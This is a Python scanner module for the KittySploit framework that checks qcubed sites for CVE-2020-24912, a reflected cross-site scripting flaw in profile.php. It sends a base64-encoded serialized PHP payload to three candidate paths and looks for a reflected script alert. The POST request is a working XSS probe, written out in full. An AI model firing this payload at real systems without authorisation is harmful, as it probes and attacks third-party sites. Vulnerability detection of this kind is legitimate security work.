#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting vulnerability in qcubed (all versions including 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'QCube Cross-Site-Scripting Detection',
        'description': 'A reflected cross-site scripting vulnerability in qcubed (all versions including 3.1.1) in profile.php via the stQuery-parameter allows unauthenticated attackers to steal sessions of authenticated users.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'qcubed', 'xss', 'seclists', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.ait.ac.at/themen/cyber-security/pentesting/security-advisories/ait-sa-20210215-03',
            'https://github.com/qcubed/qcubed/pull/1320/files',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-24912',
            'http://seclists.org/fulldisclosure/2021/Mar/30',
            'http://qcubed.com',
        ],
        'cve': 'CVE-2020-24912',
    }

    def run(self):
        for path in ('/assets/_core/php/profile.php', '/assets/php/profile.php', '/vendor/qcubed/qcubed/assets/php/profile.php'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='intDatabaseIndex=1&StrReferrer=somethinxg&strProfileData=YToxOntpOjA7YTozOntzOjEyOiJvYmpCYWNrdHJhY2UiO2E6MTp7czo0OiJhcmdzIjthOjE6e2k6MDtzOjM6IlBXTiI7fX1zOjg6InN0clF1ZXJ5IjtzOjExMjoic2VsZWN0IHZlcnNpb24oKTsgc2VsZWN0IGNvbnZlcnRfZnJvbShkZWNvZGUoJCRQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDRLJCQsJCRiYXNlNjQkJCksJCR1dGYtOCQkKSI7czoxMToiZGJsVGltZUluZm8iO3M6MToiMSI7fX0K=')
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ("<script>alert('xss')</script>",)
            header_any = ('Content-Type: text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason='QCube Cross-Site-Scripting detected',
                    path=path,
                )
                return True
        return False

